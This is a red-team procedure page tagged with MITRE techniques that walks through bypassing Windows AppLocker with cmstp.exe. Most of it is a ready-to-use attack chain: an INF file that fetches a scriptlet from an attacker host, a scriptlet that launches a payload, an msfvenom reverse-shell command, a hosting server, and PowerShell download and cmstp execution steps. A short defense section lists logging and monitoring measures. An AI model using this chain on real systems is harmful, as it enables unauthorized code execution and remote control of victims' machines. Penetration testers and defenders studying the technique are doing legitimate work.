---
id: bf952c42-aab8-43d3-bb4c-adbbe42998f6
name: Windows-AppLocker-Whitelist-Bypass-via-cmstp
type: procedure
verified: true
submitted: true
created_at: '2019-11-20T18:41:30.811422+00:00'
updated_at: '2023-05-25T19:43:27.774614+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/CMSTP|T1191 - CMSTP]]'
sub_techniques: []
platforms:
  - Windows
tags:
  - '[[tags/applocker]]'
  - '[[tags/Defense Bypass]]'
commands:
  - '[[commands/cmstp-execute-inf-file]]'
  - '[[commands/powershell-invoke-webrequest-download-file]]'
  - '[[commands/python3-launch-http-server]]'
tools: []
validated: true
---

# Windows-AppLocker-Whitelist-Bypass-via-cmstp

## Summary

This procedure bypasses Windows AppLocker whitelist restrictions by leveraging the signed Microsoft binary cmstp.exe to execute a malicious INF file. The INF file triggers the download and execution of a remote SCT file hosted on an attacker-controlled web server, which in turn runs a final payload such as a reverse shell executable. This technique exploits AppLocker's default allowances for certain system tools, enabling execution in restricted environments.

## Description

AppLocker is a Windows security feature that restricts application execution based on whitelists. However, signed Microsoft executables like cmstp.exe (Connection Manager Profile Installer) are often permitted. This procedure chains cmstp.exe with an INF file that unregisters an OCX using a URL to a remote SCT (Scriptlet) file. The SCT file, executed via scrobj.dll, runs arbitrary code, such as launching a local executable payload. The payload is downloaded to a writable directory exempt from AppLocker restrictions, like C:\Windows\Tasks. This method is effective against default AppLocker policies and requires initial access to the target system with limited execution rights.

## Requirements

1. Attacker-controlled web server to host the SCT file and serve downloads.
2. Access to the target Windows system (e.g., via initial foothold like phishing or RDP).
3. Writable directory on the target exempt from AppLocker (e.g., C:\Windows\Tasks).
4. Tools: Python 3 for web server, PowerShell for downloads (native on Windows), msfvenom for payload generation.
5. Network access from target to attacker's server (outbound HTTP/HTTPS).

## Defense

- Enable enhanced AppLocker logging via Event ID 8004/8006 in Windows Event Logs.
- Monitor cmstp.exe executions and INF/SCT file handling with Sysmon (rules for process creation with cmstp.exe parent).
- Block outbound connections to untrusted IPs and restrict writable directories.
- Use Windows Defender Application Control (WDAC) for stricter policy enforcement beyond default AppLocker.

## Objectives

1. Identify a writable, AppLocker-exempt directory on the target.
2. Create and host chained INF/SCT files and a payload executable.
3. Download necessary files to the target and execute via cmstp.exe to achieve code execution (e.g., reverse shell).
3. Establish persistence or exfiltration via the executed payload.

## Instructions

### Step 1: Identify Writable Directory

**Context**: AppLocker often restricts execution to specific paths, so locate an exempt writable directory like C:\Windows\Tasks using known bypass lists.

Consult resources such as the Ultimate AppLocker Bypass List for candidates. Verify writability by attempting to create a test file.

**Command** (use native dir or icacls for verification):
```cmd
icacls C:\Windows\Tasks
```

> This command checks permissions. Look for (F) full control or (W) write access for the current user.

### Step 2: Create INF File for SCT Execution

**Context**: Generate the INF file that instructs cmstp.exe to download and execute the remote SCT file via OCX unregistration.

Create 'pwn.inf' using the following code snippet.

**Code** ([[codes/pwn-inf-file-for-remote-sct-execution]]):

```inf
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```

> Save as pwn.inf on the attacker machine. This will be hosted or copied.

### Step 3: Create SCT File for Payload Execution

**Context**: The SCT file runs the local payload executable once downloaded to the target.

Create 'pwn.sct' with the scriptlet that launches the shell.exe.

**Code** ([[codes/pwn-sct-file-for-local-payload-launch]]):

```sct
<?XML version="1.0"?>
<scriptlet>
<registration 
  progid="PoC"
  classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\Tasks\\shell.exe");

       ]]>
</script>
</registration>
</scriptlet>
```

> Save as pwn.sct and host on the web server. Update the path if using a different directory.

### Step 4: Generate Final Payload Executable

**Context**: Create a reverse shell executable using msfvenom to serve as the final payload.

Run the following on the attacker machine to generate shell.exe.

**Code** ([[codes/msfvenom-windows-x64-reverse-tcp-shell-exe]]):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o shell.exe
```

> This produces shell.exe, a reverse shell connecting back to the attacker. Place a listener (e.g., netcat) on $_ATTACKER_PORT.

### Step 5: Host Files on Web Server

**Context**: Launch a simple HTTP server to serve the SCT, INF, and EXE files to the target.

Place pwn.sct, pwn.inf, and shell.exe in a directory on the attacker machine.

**Command** ([[commands/python3-launch-http-server]]):
```bash
python3 -m http.server $_PORT
```

> This starts a server on port $_PORT (e.g., 80). Note the attacker's IP for URLs.

### Step 6: Download Files to Target

**Context**: On the target, download the INF and EXE files to the writable directory using PowerShell.

Execute twice: once for pwn.inf and once for shell.exe.

**Command** ([[commands/powershell-invoke-webrequest-download-file]]):
```powershell
Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
```

> Replace $_REMOTE_IP with attacker IP, $_FILENAME with 'pwn.inf' or 'shell.exe'. Ensure Outfile path is C:\Windows\Tasks\ (e.g., -Outfile C:\Windows\Tasks\pwn.inf).

### Step 7: Execute INF via CMSTP

**Context**: Run cmstp.exe with the INF file to trigger the chain: INF -> remote SCT -> local EXE.

From the target command prompt in the writable directory.

**Command** ([[commands/cmstp-execute-inf-file]]):
```cmd
cmstp.exe /ni /s C:\$_DEST_DIR\$_FILE_NAME.inf
```

> Use /ni for no UI, /s for silent. This executes the INF, downloading and running the SCT, which launches shell.exe.
